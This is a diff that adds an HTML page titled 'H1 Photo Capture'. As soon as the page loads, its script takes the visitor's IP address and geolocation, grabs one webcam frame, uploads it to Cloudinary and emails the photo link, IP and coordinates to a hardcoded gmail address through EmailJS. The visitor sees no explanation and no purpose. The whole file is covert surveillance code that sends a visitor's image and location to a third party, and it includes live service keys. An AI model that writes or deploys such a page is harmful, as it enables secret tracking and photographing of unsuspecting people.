@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>H1 Photo Capture</title>
+</head>
+<body>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS public key
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    async function getLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            });
+          },
+          () => {
+            resolve({ latitude: "Unavailable", longitude: "Unavailable" });
+          }
+        );
+      });
+    }
+
+    async function uploadToCloudinary(blob) {
+      const formData = new FormData();
+      formData.append("file", blob);
+      formData.append("upload_preset", "unsigned_video_uploads"); // Your preset
+
+      const res = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/image/upload", { // Your Cloud name
+        method: "POST",
+        body: formData
+      });
+
+      const data = await res.json();
+      return data.secure_url;
+    }
+
+    async function captureAndSendPhoto() {
+      try {
+        const ip = await getIP();
+        const location = await getLocation();
+
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        canvas.toBlob(async (blob) => {
+          const imageUrl = await uploadToCloudinary(blob);
+
+          const message = `
+You received a new photo.
+
+Download link: ${imageUrl}
+Sender IP: ${ip}
+Latitude: ${location.latitude}
+Longitude: ${location.longitude}
+`;
+
+          await emailjs.send("service_khmk344", "template_oyrsayr", {
+            to_email: "julianlee252@gmail.com",
+            message: message.trim()
+          });
+
+          console.log("✅ Photo email sent.");
+        }, "image/jpeg");
+      } catch (err) {
+        console.error("Error capturing photo or sending email:", err);
+      }
+    }
+
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(() => {
+          captureAndSendPhoto();
+        }, () => {
+          alert("Location permission denied. Email will not include coordinates.");
+          captureAndSendPhoto();
+        });
+      } else {
+        captureAndSendPhoto();
+      }
+    };
+  </script>
+</body>
+</html>
